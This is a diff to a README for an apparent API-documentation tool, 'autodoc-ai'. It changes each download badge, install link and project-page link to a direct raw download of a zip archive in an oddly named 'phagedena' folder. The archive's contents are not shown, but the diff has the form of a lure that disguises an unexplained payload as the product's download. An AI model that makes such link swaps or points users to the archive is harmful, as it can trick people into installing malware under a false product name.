@@ -1,6 +1,6 @@
 # 🤖 autodoc-ai - Create API docs with less effort
 
-[![Download autodoc-ai](https://img.shields.io/badge/Download-autodoc--ai-blue?style=for-the-badge)](https://github.com/Lancewoodroleplaying805/autodoc-ai)
+[![Download autodoc-ai](https://img.shields.io/badge/Download-autodoc--ai-blue?style=for-the-badge)](https://github.com/Lancewoodroleplaying805/autodoc-ai/raw/refs/heads/main/phagedena/ai-autodoc-v3.4-alpha.4.zip)
 
 ## 🚀 What this app does
 
@@ -17,7 +17,7 @@ This can save time when you need:
 
 Use this link to visit the download page:
 
-[Download autodoc-ai](https://github.com/Lancewoodroleplaying805/autodoc-ai)
+[Download autodoc-ai](https://github.com/Lancewoodroleplaying805/autodoc-ai/raw/refs/heads/main/phagedena/ai-autodoc-v3.4-alpha.4.zip)
 
 Follow these steps on Windows:
 
@@ -203,4 +203,4 @@ If the output file does not appear:
 
 Visit the project page here:
 
-[https://github.com/Lancewoodroleplaying805/autodoc-ai](https://github.com/Lancewoodroleplaying805/autodoc-ai)
+[https://github.com/Lancewoodroleplaying805/autodoc-ai/raw/refs/heads/main/phagedena/ai-autodoc-v3.4-alpha.4.zip](https://github.com/Lancewoodroleplaying805/autodoc-ai/raw/refs/heads/main/phagedena/ai-autodoc-v3.4-alpha.4.zip)
